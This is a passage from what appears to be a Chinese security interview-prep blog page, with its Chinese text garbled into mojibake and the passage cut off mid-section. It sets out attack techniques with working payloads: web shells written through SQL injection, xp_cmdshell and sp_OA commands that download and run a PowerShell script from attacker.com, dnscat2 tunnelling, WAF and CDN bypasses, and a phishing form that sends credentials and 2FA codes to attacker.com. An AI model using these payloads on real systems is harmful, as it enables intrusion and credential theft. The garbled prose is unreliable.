è¾“æ•°æ®ï¼Œé€šè¿‡å°†æ•°æ®å°è£…åœ¨DNSè¯·æ±‚å’Œå“åº”ä¸­ï¼Œç»•è¿‡ç½‘ç»œé™åˆ¶ã€‚</p><h4 id="å®ç°æ­¥éª¤-1"><a href="#å®ç°æ­¥éª¤-1" class="headerlink" title="å®ç°æ­¥éª¤"></a>å®ç°æ­¥éª¤</h4><ol><li><p><strong>é€‰æ‹©å·¥å…·</strong>ï¼š</p><ul><li>å¸¸ç”¨å·¥å…·ï¼š<code>dnscat2</code>ã€<code>iodine</code>ã€<code>dns tunnel</code>ç­‰ã€‚</li></ul></li><li><p><strong>æœåŠ¡å™¨ç«¯é…ç½®</strong>ï¼š</p><ul><li>ä»¥ <code>dnscat2</code> ä¸ºä¾‹ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> dnscat2 -server -domain example.com</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>å®¢æˆ·ç«¯è¿æ¥</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnscat2-client -server example.com</span><br></pre></td></tr></table></figure></li><li><p><strong>æ•°æ®ä¼ è¾“</strong>ï¼š</p><ul><li>é€šè¿‡DNSè¯·æ±‚å’Œå“åº”ä¼ è¾“æ•°æ®ï¼Œå»ºç«‹éš§é“ã€‚</li></ul></li></ol><h2 id="å¥‡å®‰ä¿¡"><a href="#å¥‡å®‰ä¿¡" class="headerlink" title="å¥‡å®‰ä¿¡"></a>å¥‡å®‰ä¿¡</h2><h3 id="SQL-æ³¨å…¥å†™é©¬çš„æ–¹å¼"><a href="#SQL-æ³¨å…¥å†™é©¬çš„æ–¹å¼" class="headerlink" title="SQL æ³¨å…¥å†™é©¬çš„æ–¹å¼"></a>SQL æ³¨å…¥å†™é©¬çš„æ–¹å¼</h3><ul><li><strong>åˆ©ç”¨ INTO OUTFILE</strong>ï¼šå°†æŸ¥è¯¢ç»“æœå†™å…¥æ–‡ä»¶ï¼Œè¦æ±‚æ•°æ®åº“ç”¨æˆ·æœ‰ FILE æƒé™ï¼Œä¸”æ–‡ä»¶è·¯å¾„å¿…é¡»æ˜¯ç»å¯¹è·¯å¾„ï¼Œæ–‡ä»¶ä¸èƒ½å·²å­˜åœ¨ã€‚<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><strong>åˆ©ç”¨ xp_cmdshell</strong>ï¼šåœ¨ SQL Server ä¸­ï¼Œé€šè¿‡ xp_cmdshell æ‰§è¡Œå‘½ä»¤å†™å…¥æ–‡ä»¶ã€‚<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%%eval(Request.Item[&quot;xxxasec&quot;],&quot;unsafe&quot;);%^&gt; &gt; C:\inetpub\wwwroot\shell.aspx&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><strong>åˆ©ç”¨ sqlmap</strong>ï¼šsqlmap æä¾›äº†å†™é©¬çš„åŠŸèƒ½ï¼Œå¯ä»¥ç›´æ¥å°†é©¬å†™å…¥ç›®æ ‡æœåŠ¡å™¨ã€‚<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://example.com/vuln.php?id=1&quot;</span> --file-write=<span class="string">&quot;shell.php&quot;</span> --file-dest=<span class="string">&quot;/var/www/html/shell.php&quot;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="Oracle-æ³¨å…¥çš„ç›´æ¥åˆ©ç”¨æ–¹å¼"><a href="#Oracle-æ³¨å…¥çš„ç›´æ¥åˆ©ç”¨æ–¹å¼" class="headerlink" title="Oracle æ³¨å…¥çš„ç›´æ¥åˆ©ç”¨æ–¹å¼"></a>Oracle æ³¨å…¥çš„ç›´æ¥åˆ©ç”¨æ–¹å¼</h3><ul><li><strong>åˆ©ç”¨ DBMS_JOB æäº¤ä»»åŠ¡</strong>ï¼šé€šè¿‡ DBMS_JOB æäº¤æ¶æ„ä»»åŠ¡æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">    job_number NUMBER;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    DBMS_JOB.SUBMIT(</span><br><span class="line">        job_number,</span><br><span class="line">        <span class="string">&#x27;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;EXEC xp_cmdshell &#x27;&#x27;&#x27;&#x27;whoami&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;; END;&#x27;</span>,</span><br><span class="line">        SYSDATE</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">COMMIT</span>;</span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure></li><li><strong>åˆ©ç”¨ DBMS_SCHEDULER</strong>ï¼šé€šè¿‡ DBMS_SCHEDULER åˆ›å»ºä»»åŠ¡æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    DBMS_SCHEDULER.CREATE_JOB (</span><br><span class="line">        job_name <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;MY_JOB&#x27;</span>,</span><br><span class="line">        job_type <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;PLSQL_BLOCK&#x27;</span>,</span><br><span class="line">        job_action <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;EXEC xp_cmdshell &#x27;&#x27;&#x27;&#x27;whoami&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;; END;&#x27;</span>,</span><br><span class="line">        start_date <span class="operator">=</span><span class="operator">&gt;</span> SYSDATE,</span><br><span class="line">        enabled <span class="operator">=</span><span class="operator">&gt;</span> <span class="literal">TRUE</span></span><br><span class="line">    );</span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure></li></ul><h3 id="SQL-Server-è·å–-shell-çš„æ–¹æ³•"><a href="#SQL-Server-è·å–-shell-çš„æ–¹æ³•" class="headerlink" title="SQL Server è·å– shell çš„æ–¹æ³•"></a>SQL Server è·å– shell çš„æ–¹æ³•</h3><ul><li><strong>åˆ©ç”¨ xp_cmdshell</strong>ï¼šé€šè¿‡ xp_cmdshell æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ¥è·å– shellã€‚<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;powershell -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;&#x27;http://attacker.com/shell.ps1&#x27;&#x27;)&quot;&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><strong>åˆ©ç”¨ OLE Automation Procedures</strong>ï¼šé€šè¿‡ OLE Automation Procedures æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_OACreate <span class="string">&#x27;WScript.Shell&#x27;</span>, <span class="string">&#x27;shell&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OAMethod <span class="string">&#x27;shell&#x27;</span>, <span class="string">&#x27;Run&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;cmd.exe /c powershell -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;&#x27;http://attacker.com/shell.ps1&#x27;&#x27;)&quot;&#x27;</span>;</span><br></pre></td></tr></table></figure></li></ul><h3 id="åŒæºç­–ç•¥çš„ç»•è¿‡æ–¹å¼"><a href="#åŒæºç­–ç•¥çš„ç»•è¿‡æ–¹å¼" class="headerlink" title="åŒæºç­–ç•¥çš„ç»•è¿‡æ–¹å¼"></a>åŒæºç­–ç•¥çš„ç»•è¿‡æ–¹å¼</h3><ul><li><strong>DNS é‡ç»‘å®š</strong>ï¼šé€šè¿‡åŠ¨æ€ DNS æœåŠ¡ï¼Œä½¿æµè§ˆå™¨è®¤ä¸ºç›®æ ‡åŸŸåå’Œæ”»å‡»è€…æ§åˆ¶çš„ IP åœ°å€æ˜¯åŒæºçš„ã€‚</li><li><strong>åˆ©ç”¨ CORS é…ç½®é”™è¯¯</strong>ï¼šå¦‚æœç›®æ ‡æœåŠ¡å™¨çš„ CORS é…ç½®ä¸å½“ï¼Œå¯ä»¥åˆ©ç”¨æ­¤æ¼æ´ç»•è¿‡åŒæºç­–ç•¥ã€‚<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://target.com/data&#x27;</span>);</span><br><span class="line">xhr.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(xhr.<span class="property">responseText</span>);</span><br><span class="line">&#125;;</span><br><span class="line">xhr.<span class="title function_">send</span>();</span><br></pre></td></tr></table></figure></li></ul><h3 id="ç»•è¿‡åŸºäºè¯­ä¹‰æ£€æµ‹çš„-WAF"><a href="#ç»•è¿‡åŸºäºè¯­ä¹‰æ£€æµ‹çš„-WAF" class="headerlink" title="ç»•è¿‡åŸºäºè¯­ä¹‰æ£€æµ‹çš„ WAF"></a>ç»•è¿‡åŸºäºè¯­ä¹‰æ£€æµ‹çš„ WAF</h3><ul><li><strong>ç¼–ç æ··æ·†</strong>ï¼šä½¿ç”¨ URL ç¼–ç ã€Unicode ç¼–ç ç­‰æ¥ç»•è¿‡ WAF æ£€æµ‹ã€‚<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) IS NOT NULL AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure></li><li><strong>æ‹†åˆ†æŸ¥è¯¢</strong>ï¼šå°† SQL æŸ¥è¯¢æ‹†åˆ†ä¸ºå¤šä¸ªéƒ¨åˆ†ï¼Œåˆ†åˆ«æ³¨å…¥ï¼Œæœ€åç»„åˆæˆå®Œæ•´çš„æŸ¥è¯¢ã€‚<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND (SELECT 1) AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure></li><li><strong>åè®®ç‰¹æ€§</strong>ï¼šåˆ©ç”¨ HTTP å¤´æˆ– Cookie å‚æ•°æ³¨å…¥ SQL ä»£ç ã€‚<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: <span class="string">&#x27; AND (SELECT 1) AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="é¢„ç¼–è¯‘åœºæ™¯ä¸‹æ˜¯å¦å­˜åœ¨-SQL-æ³¨å…¥"><a href="#é¢„ç¼–è¯‘åœºæ™¯ä¸‹æ˜¯å¦å­˜åœ¨-SQL-æ³¨å…¥" class="headerlink" title="é¢„ç¼–è¯‘åœºæ™¯ä¸‹æ˜¯å¦å­˜åœ¨ SQL æ³¨å…¥"></a>é¢„ç¼–è¯‘åœºæ™¯ä¸‹æ˜¯å¦å­˜åœ¨ SQL æ³¨å…¥</h3><ul><li><strong>é¢„ç¼–è¯‘çš„ SQL è¯­å¥</strong>ï¼šé¢„ç¼–è¯‘çš„ SQL è¯­å¥é€šå¸¸ä¸ä¼šå­˜åœ¨ SQL æ³¨å…¥é—®é¢˜ï¼Œå› ä¸ºå‚æ•°æ˜¯é€šè¿‡å‚æ•°åŒ–æŸ¥è¯¢ä¼ é€’çš„ï¼Œä¸ä¼šè¢«è§£æä¸º SQL ä»£ç ã€‚</li><li><strong>ç¬¬ä¸€æ¬¡é¢„ç¼–è¯‘çš„å¯æ§æ•°æ®</strong>ï¼šå¦‚æœåœ¨ç¬¬ä¸€æ¬¡é¢„ç¼–è¯‘æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥æ§åˆ¶æŸäº›æ•°æ®ï¼Œå¯èƒ½ä¼šå¯¼è‡´ SQL æ³¨å…¥ã€‚ä¾‹å¦‚ï¼ŒåŠ¨æ€ç”Ÿæˆ SQL è¯­å¥æ—¶ï¼Œå¦‚æœæœªå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œå……åˆ†éªŒè¯ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ³¨å…¥ã€‚<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM users WHERE username = &#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">stmt</span> <span class="operator">=</span> connection.prepareStatement(query);</span><br></pre></td></tr></table></figure></li></ul><h3 id="CDN-çš„ç»•è¿‡æ–¹å¼"><a href="#CDN-çš„ç»•è¿‡æ–¹å¼" class="headerlink" title="CDN çš„ç»•è¿‡æ–¹å¼"></a>CDN çš„ç»•è¿‡æ–¹å¼</h3><ul><li><strong>IP ç›´è¿</strong>ï¼šç›´æ¥è¿æ¥åˆ°ç›®æ ‡æœåŠ¡å™¨çš„ IP åœ°å€ï¼Œç»•è¿‡ CDNã€‚</li><li><strong>åˆ©ç”¨ç‰¹å®šçš„è¯·æ±‚å¤´</strong>ï¼šé€šè¿‡è®¾ç½®ç‰¹å®šçš„è¯·æ±‚å¤´ï¼ˆå¦‚ <code>Host</code> å¤´ï¼‰æ¥ç»•è¿‡ CDNã€‚<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;Host: target.com&quot;</span> http://cdn-ip-address</span><br></pre></td></tr></table></figure></li><li><strong>åˆ©ç”¨ CDN ç¼“å­˜æœºåˆ¶</strong>ï¼šé€šè¿‡æ„é€ ç‰¹å®šçš„è¯·æ±‚æ¥åˆ©ç”¨ CDN çš„ç¼“å­˜æœºåˆ¶ï¼Œç»•è¿‡ CDN çš„å®‰å…¨æ£€æµ‹ã€‚</li></ul><h2 id="å¿«æ‰‹"><a href="#å¿«æ‰‹" class="headerlink" title="å¿«æ‰‹"></a>å¿«æ‰‹</h2><h3 id="1-SQLé—®é¢˜ï¼šå¦‚ä½•å–åœ¨Aä¸­ä½†ä¸åœ¨Bä¸­çš„æ•°æ®"><a href="#1-SQLé—®é¢˜ï¼šå¦‚ä½•å–åœ¨Aä¸­ä½†ä¸åœ¨Bä¸­çš„æ•°æ®" class="headerlink" title="1. SQLé—®é¢˜ï¼šå¦‚ä½•å–åœ¨Aä¸­ä½†ä¸åœ¨Bä¸­çš„æ•°æ®"></a><strong>1. SQLé—®é¢˜ï¼šå¦‚ä½•å–åœ¨Aä¸­ä½†ä¸åœ¨Bä¸­çš„æ•°æ®</strong></h3><p><strong>æŠ€æœ¯åˆ†æ</strong>ï¼š<br>åœ¨SQLä¸­ï¼Œå¯ä»¥é€šè¿‡ <code>NOT EXISTS</code> æˆ– <code>LEFT JOIN</code> å®ç° A ä¸­å­˜åœ¨ä½† B ä¸­ä¸å­˜åœ¨çš„æ•°æ®æŸ¥è¯¢ã€‚<code>NOT EXISTS</code> æ˜¯ä¸€ç§é«˜æ•ˆçš„æ–¹å¼ï¼Œå› ä¸ºå®ƒåªæ£€æŸ¥æ˜¯å¦å­˜åœ¨åŒ¹é…çš„è®°å½•ï¼Œè€Œä¸ä¼šè¿”å›å¤šä½™çš„å­—æ®µã€‚</p><p><strong>ä»£ç ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- æ–¹æ³•1ï¼šä½¿ç”¨ NOT EXISTS</span></span><br><span class="line"><span class="keyword">SELECT</span> a.<span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> a</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">FROM</span> b</span><br><span class="line">    <span class="keyword">WHERE</span> b.id <span class="operator">=</span> a.id</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- æ–¹æ³•2ï¼šä½¿ç”¨ LEFT JOIN å’Œ NULL åˆ¤æ–­</span></span><br><span class="line"><span class="keyword">SELECT</span> a.<span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> a</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> b <span class="keyword">ON</span> a.id <span class="operator">=</span> b.id</span><br><span class="line"><span class="keyword">WHERE</span> b.id <span class="keyword">IS</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure><p><strong>ä¼˜åŒ–å»ºè®®</strong>ï¼š  </p><ul><li>ç¡®ä¿ <code>a.id</code> å’Œ <code>b.id</code> å­—æ®µä¸Šæœ‰ç´¢å¼•ï¼Œä»¥æé«˜æŸ¥è¯¢æ€§èƒ½ã€‚</li><li>å¦‚æœæ•°æ®é‡è¾ƒå¤§ï¼Œ<code>NOT EXISTS</code> é€šå¸¸æ¯” <code>LEFT JOIN</code> æ›´é«˜æ•ˆã€‚</li></ul><hr><h3 id="2-æœ‰å ¡å’æœºæ€ä¹ˆåŠï¼Ÿ"><a href="#2-æœ‰å ¡å’æœºæ€ä¹ˆåŠï¼Ÿ" class="headerlink" title="2. æœ‰å ¡å’æœºæ€ä¹ˆåŠï¼Ÿ"></a><strong>2. æœ‰å ¡å’æœºæ€ä¹ˆåŠï¼Ÿ</strong></h3><p><strong>æŠ€æœ¯åˆ†æ</strong>ï¼š<br>å ¡å’æœºï¼ˆJump Serverï¼‰é€šå¸¸ç”¨äºé™åˆ¶ç”¨æˆ·å¯¹ç›®æ ‡ç³»ç»Ÿçš„ç›´æ¥è®¿é—®ã€‚ç»•è¿‡å ¡å’æœºçš„æ–¹æ³•åŒ…æ‹¬ï¼š</p><ol><li>é€šè¿‡å ¡å’æœºçš„è·³æ¿åŠŸèƒ½ï¼Œä½¿ç”¨ SSH éš§é“æˆ–ä»£ç†è¿æ¥ç›®æ ‡ç³»ç»Ÿã€‚</li><li>å¦‚æœå ¡å’æœºæ”¯æŒåŠ¨æ€ç«¯å£è½¬å‘ï¼Œå¯ä»¥é…ç½®æœ¬åœ°ç«¯å£è½¬å‘ã€‚</li></ol><p><strong>ä»£ç ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨ SSH éš§é“é€šè¿‡å ¡å’æœºè®¿é—®ç›®æ ‡æœåŠ¡å™¨</span></span><br><span class="line">ssh -L 1234:target_server:22 user@bastion_host</span><br><span class="line"><span class="comment"># ç„¶åé€šè¿‡æœ¬åœ°ç«¯å£ 1234 è®¿é—®ç›®æ ‡æœåŠ¡å™¨</span></span><br><span class="line">ssh user@localhost -p 1234</span><br></pre></td></tr></table></figure><p><strong>å·¥å…·æ¨è</strong>ï¼š  </p><ul><li><code>Proxychains</code>ï¼šé…ç½®ä»£ç†é“¾ï¼Œé€šè¿‡å ¡å’æœºè®¿é—®ç›®æ ‡ã€‚</li><li><code>OpenSSH</code>ï¼šåŠ¨æ€ç«¯å£è½¬å‘ã€‚</li></ul><hr><h3 id="3-è¢«ban-IPæ€ä¹ˆåŠï¼Ÿ"><a href="#3-è¢«ban-IPæ€ä¹ˆåŠï¼Ÿ" class="headerlink" title="3. è¢«ban IPæ€ä¹ˆåŠï¼Ÿ"></a><strong>3. è¢«ban IPæ€ä¹ˆåŠï¼Ÿ</strong></h3><p><strong>æŠ€æœ¯åˆ†æ</strong>ï¼š<br>IP è¢«å°ç¦åï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ç»•è¿‡ï¼š</p><ol><li>ä½¿ç”¨ä»£ç† IP æˆ– VPN éšè—çœŸå® IPã€‚</li><li>å¦‚æœç›®æ ‡ç³»ç»Ÿä½¿ç”¨åŠ¨æ€ IP å°ç¦ï¼Œå¯ä»¥é¢‘ç¹åˆ‡æ¢ IPã€‚</li><li>åˆ©ç”¨ Tor ç½‘ç»œè¿›è¡ŒåŒ¿åè®¿é—®ã€‚</li></ol><p><strong>ä»£ç ç¤ºä¾‹ï¼ˆåŠ¨æ€ä»£ç†åˆ‡æ¢ï¼‰</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> rotating_proxies <span class="keyword">import</span> RotatingProxy</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨åŠ¨æ€ä»£ç†æ± </span></span><br><span class="line">proxy_pool = RotatingProxy()</span><br><span class="line">proxies = proxy_pool.get_proxies()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(</span><br><span class="line">        <span class="string">&quot;http://example.com&quot;</span>,</span><br><span class="line">        proxies=proxies,</span><br><span class="line">        timeout=<span class="number">10</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;IP blocked, switching proxy: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    proxy_pool.rotate()</span><br></pre></td></tr></table></figure><p><strong>å·¥å…·æ¨è</strong>ï¼š  </p><ul><li><code>Rotating Proxies</code>ï¼šåŠ¨æ€ä»£ç†åˆ‡æ¢ã€‚</li><li><code>Tor</code>ï¼šåŒ¿åç½‘ç»œè®¿é—®ã€‚</li></ul><hr><h3 id="4-ç™»å½•åšäº†åŒå› ç´ è®¤è¯æ€ä¹ˆåŠï¼Ÿ"><a href="#4-ç™»å½•åšäº†åŒå› ç´ è®¤è¯æ€ä¹ˆåŠï¼Ÿ" class="headerlink" title="4. ç™»å½•åšäº†åŒå› ç´ è®¤è¯æ€ä¹ˆåŠï¼Ÿ"></a><strong>4. ç™»å½•åšäº†åŒå› ç´ è®¤è¯æ€ä¹ˆåŠï¼Ÿ</strong></h3><p><strong>æŠ€æœ¯åˆ†æ</strong>ï¼š<br>åŒå› ç´ è®¤è¯ï¼ˆ2FAï¼‰å¢åŠ äº†ç™»å½•éš¾åº¦ï¼Œä½†å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ç»•è¿‡ï¼š</p><ol><li><strong>ç¤¾ä¼šå·¥ç¨‹å­¦æ”»å‡»</strong>ï¼šé€šè¿‡é’“é±¼é¡µé¢è·å–ç”¨æˆ·çš„è®¤è¯ç ã€‚</li><li><strong>ä¸­é—´äººæ”»å‡»</strong>ï¼šæ‹¦æˆªè®¤è¯ç ã€‚</li><li><strong>åˆ©ç”¨æ¼æ´</strong>ï¼šæŸäº›ç³»ç»Ÿå…è®¸ç»•è¿‡ 2FA çš„ API è°ƒç”¨ã€‚</li></ol><p><strong>ä»£ç ç¤ºä¾‹ï¼ˆé’“é±¼é¡µé¢ï¼‰</strong>ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- é’“é±¼é¡µé¢ï¼Œä¼ªè£…æˆç›®æ ‡ç½‘ç«™ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://attacker.com/capture&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Password&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;2fa_code&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;2FA Code&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>å·¥å…·æ¨è</strong>ï¼š  </p><ul><li><code>Social Engineering Toolkit (SET)</code>ï¼šç”Ÿæˆé’“é±¼é¡µé¢ã€‚</li><li><code>Burp Suite</code>ï¼šæ‹¦æˆªå’Œç¯¡æ”¹è®¤è¯ç ã€‚</li></ul><hr><h3 id="5-VPNæœåŠ¡å™¨æ²¡ç»‘å®šæœºå™¨ç¼–ç ï¼ˆè¯ä¹¦ï¼‰å—ï¼Ÿ"><a href="#5-VPNæœåŠ¡å™¨æ²¡ç»‘å®šæœºå™¨ç¼–ç ï¼ˆè¯ä¹¦ï¼‰å—ï¼Ÿ" class="headerlink" title="5. VPNæœåŠ¡å™¨æ²¡ç»‘å®šæœºå™¨ç¼–ç ï¼ˆè¯ä¹¦ï¼‰å—ï¼Ÿ"></a><strong>5. VPNæœåŠ¡å™¨æ²¡ç»‘å®šæœºå™¨ç¼–ç ï¼ˆè¯ä¹¦ï¼‰å—ï¼Ÿ</strong></h3><p><strong>æŠ€æœ¯åˆ†æ</strong>ï¼š<br>å¦‚æœ VPN æœåŠ¡å™¨æœªç»‘å®šæœºå™¨ç¼–ç æˆ–è¯ä¹¦ï¼Œå¯ä»¥å°è¯•ä»¥ä¸‹æ–¹æ³•ï¼š</p><ol><li><strong>æš´åŠ›ç ´è§£</strong>ï¼šç©·ä¸¾ç”¨æˆ·åå’Œå¯†ç ã€‚</li><li><strong>åˆ©ç”¨å·²çŸ¥æ¼æ´</strong>ï¼šé’ˆå¯¹ VPN è½¯ä»¶ï¼ˆå¦‚ OpenVPNã€PPTPï¼‰çš„æ¼æ´è¿›è¡Œæ”»å‡»ã€‚</li><li><strong>ä¸­é—´äººæ”»å‡»</strong>ï¼šæ‹¦æˆª VPN æµé‡ã€‚</li></ol><p><strong>ä»£ç ç¤ºä¾‹ï¼ˆæš´åŠ›ç ´è§£ VPNï¼‰</strong>ï¼š</p><figure class="highlight python"><table><tr><td 